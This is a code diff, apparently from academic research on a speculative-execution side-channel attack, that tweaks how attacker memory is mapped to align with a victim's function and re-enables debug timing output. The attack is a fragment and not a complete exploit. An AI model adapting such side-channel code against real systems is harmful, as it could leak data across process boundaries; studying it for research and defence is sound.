@@ -5,6 +5,7 @@
 #define maxCopyLength 128
 #define iterations 10000
 #define maxCacheHitTime 100
+#define useFirstMmap 1
 
 using namespace std;
 
@@ -105,7 +106,7 @@ int doSearch(ADDR_PTR low, ADDR_PTR high) {
 	}
 
 	int result = checkForMisspeculation();
-	// printf("low: %p, high: %p, diff: %lu time:%i\n", low, high, difference, result);
+	printf("low: %p, high: %p, diff: %lu time:%i\n", low, high, difference, result);
 
 	// Zero the memory to prepare for the next check.
 	memset((void *)low, 0, difference);
@@ -150,8 +151,8 @@ void* getMmapSpace() {
 
 	// Ideally we would start searching from the end of Attacker's code segment.
 	// This causes segfaults, as discussed in our paper.
-	// startAddr = (void *)(ADDR_PTR(&lastFunction) + (1<<13));
-	startAddr = (void *)0x5572e3000000;
+	startAddr = (void *)(ADDR_PTR(&lastFunction) + (1<<13));
+	// startAddr = (void *)0x5572e3000000;
 
 	// Find the chunk which aligns with the victim's function call. 
 	for (int i = 0; i < 1000; i++) {
@@ -168,6 +169,10 @@ void* getMmapSpace() {
 
 		unmap(startAddr);
 		startAddr = endAddr;
+
+		if (useFirstMmap) {
+			break;
+		}
 	}
 
 	return bestStartAddr;
